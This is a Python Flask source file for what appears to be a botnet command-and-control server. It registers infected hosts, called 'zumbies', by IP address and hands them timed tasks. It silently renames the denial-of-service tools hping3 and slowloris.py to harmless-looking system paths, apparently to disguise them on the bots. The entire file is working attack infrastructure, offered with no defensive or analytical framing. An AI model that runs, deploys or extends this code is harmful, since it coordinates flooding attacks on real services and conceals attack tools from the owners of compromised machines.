from flask import Flask, request, render_template
import datetime

app = Flask(__name__, static_url_path='/s', static_folder='static')
zumbies = {}
tasks = {}


@app.route("/")
def get_home():
    return render_template("index.html")


@app.route("/register", methods=["POST"])
def register_zumbi():
    global zumbies
    zumbies[request.remote_addr] = request.get_json()
    zumbies[request.remote_addr]["_tasks"] = {}
    return "OK"


@app.route("/zumbies", methods=["GET"])
def get_zumbies():
    global zumbies
    return zumbies, 200


@app.route("/new_task", methods=["POST"])
def new_task():
    global tasks
    data = request.get_json()
    try:
        when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S")
    except:
        return "Invalid 'when' attribute (format YYYY-MM-DD,HH:MM:SS)", 400
    if when.timestamp() < datetime.datetime.now().timestamp() + 90:
        return "Invalid 'when' attribute: must be at least 90s from now", 400
    if when.timestamp() in tasks:
        return "Cannot add two tasks at the same time", 400
    tasks[when.timestamp()] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris.py", "/usr/bin/linux_verify")
    return "OK"


@app.route("/get_tasks", methods=["GET"])
def get_tasks():
    global zumbies, tasks
    next_tasks = []
    now = datetime.datetime.now().timestamp()
    zumbi = zumbies.get(request.remote_addr)
    if not zumbi:
        zumbies[request.remote_addr] = {"_tasks": {}}
        zumbi = zumbies[request.remote_addr]
    for when, task in tasks.items():
        if when < now + 10:
            continue
        if when in zumbi["_tasks"]:
            continue
        next_tasks.append(f"{when - now};{task}")
        zumbi["_tasks"][when] = True
    return "\n".join(next_tasks), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
